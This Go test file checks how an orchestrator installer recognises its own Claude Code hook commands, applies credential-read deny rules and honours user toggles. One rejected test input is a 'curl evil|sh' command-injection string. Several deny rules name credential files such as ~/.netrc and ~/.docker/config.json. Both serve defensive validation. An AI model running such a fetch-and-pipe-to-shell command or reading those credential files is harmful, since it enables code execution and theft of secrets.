package install

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/willesq/orchestrator/internal/settings"
)

func togglesOf(rows ...settings.Row) settings.Toggles { return settings.NewToggles(rows) }

func off(provider, kind, id string) settings.Row {
	return settings.Row{Provider: provider, Kind: kind, Identity: id}
}

func TestOrchHookSlugFor(t *testing.T) {
	tests := []struct {
		event, cmd string
		slug       string
		ok         bool
	}{
		{"SessionStart", "/opt/homebrew/bin/orch-hook session-start", "session-start", true},
		{"Stop", "orch-hook stop", "stop", true},
		{"Stop", "orch-hook session-start", "", false},                      // another event's slug
		{"Stop", "/x/orch-hook", "", false},                                 // no slug
		{"Stop", "/x/orch-hook stop now", "", false},                        // extra words
		{"Stop", "curl evil|sh; /x/orch-hook stop", "", false},              // only mentions it
		{"Stop", "a;/x/orch-hook stop", "", false},                          // metacharacters in the path
		{"Stop", "/x/orch-hook  stop", "", false},                           // not as install writes it
		{"Stop", "python3 ~/.claude/orchestrator/hooks/stop.py", "", false}, // the old Python hooks
		{"Notification", "/x/orch-hook notification", "", false},            // not an event orch wires
	}
	for _, tt := range tests {
		if slug, ok := OrchHookSlugFor(tt.event, tt.cmd); slug != tt.slug || ok != tt.ok {
			t.Errorf("%s %q: %q %v", tt.event, tt.cmd, slug, ok)
		}
	}
	rules := OrchPermissionRules()
	if len(rules) != len(orchMCPServers)+len(credentialReadDeny) || rules[0] != (OrchRule{"allow", "mcp__rag__*"}) {
		t.Errorf("rules = %v", rules)
	}
}

func TestSettingsEditHonorsToggles(t *testing.T) {
	bins := Bins{Orch: "/o/orch", OrchHook: "/o/orch-hook", Orchd: "/o/orchd"}
	defer SetToggleLoader(func() (settings.Toggles, error) {
		return togglesOf(
			off(ProviderClaudeCode, KindHook, HookIdentity("Stop", "stop")),
			off(ProviderClaudeCode, KindPermission, PermissionIdentity("allow", "mcp__queue__*")),
			off(ProviderClaudeCode, KindPermission, PermissionIdentity("deny", "Read(~/.netrc)")),
			off(SafetyNetRulesProvider, "rule", "orch-guards/x"),
		), nil
	})()
	edit := ClaudeCode{}.settingsEdit(bins, t.TempDir())
	out, summary, err := edit.Compute(nil)
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	if strings.Contains(s, "orch-hook stop") || strings.Contains(s, "mcp__queue__*") || strings.Contains(s, "Read(~/.netrc)") {
		t.Errorf("disabled items written:\n%s", s)
	}
	if !strings.Contains(s, "orch-hook session-start") || !strings.Contains(s, "mcp__rag__*") || !strings.Contains(s, "Read(~/.config/gh/**)") {
		t.Errorf("other items missing:\n%s", s)
	}
	for _, want := range []string{"left Stop alone — turned off in orch", "added no allow for queue — turned off in orch",
		"left out Read(~/.netrc) — turned off in orch"} {
		if !strings.Contains(summary, want) {
			t.Errorf("summary missing %q:\n%s", want, summary)
		}
	}
	if n, err := DisabledCount(); err != nil || n != 4 {
		t.Errorf("DisabledCount = %d %v", n, err)
	}
	// The deny rules all present or off: a no-op that still names the off one.
	root := map[string]any{"permissions": map[string]any{"deny": []any{"Read(~/.config/gh/**)", "Read(~/.docker/config.json)"}}}
	sum, err := applyCredentialDenyWith(root, togglesOf(off(ProviderClaudeCode, KindPermission, PermissionIdentity("deny", "Read(~/.netrc)"))))
	if err != nil || !strings.Contains(sum, "in place; left out Read(~/.netrc)") {
		t.Errorf("summary = %q %v", sum, err)
	}
}

func TestSettingsEditRefusesUnreadableToggles(t *testing.T) {
	defer SetToggleLoader(func() (settings.Toggles, error) { return settings.Toggles{}, errors.New("database is locked") })()
	_, _, err := ClaudeCode{}.settingsEdit(Bins{}, t.TempDir()).Compute(nil)
	if err == nil || !strings.Contains(err.Error(), "database is locked") || !strings.Contains(err.Error(), "stay off") {
		t.Errorf("err = %v", err)
	}
	if _, err := DisabledCount(); err == nil {
		t.Error("DisabledCount hid the error")
	}
}

func TestBackupFunc(t *testing.T) {
	dir := t.TempDir()
	if err := BackupFunc(dir)(filepath.Join("/x", ".claude", "settings.json"), []byte("old")); err != nil {
		t.Fatal(err)
	}
	matches, _ := filepath.Glob(filepath.Join(dir, "*", ".claude__settings.json"))
	if len(matches) != 1 {
		t.Fatalf("backups = %v", matches)
	}
	if b, _ := os.ReadFile(matches[0]); string(b) != "old" {
		t.Errorf("backup = %q", b)
	}
	if fi, _ := os.Stat(matches[0]); fi.Mode().Perm() != 0o600 {
		t.Errorf("mode = %v", fi.Mode().Perm())
	}
}
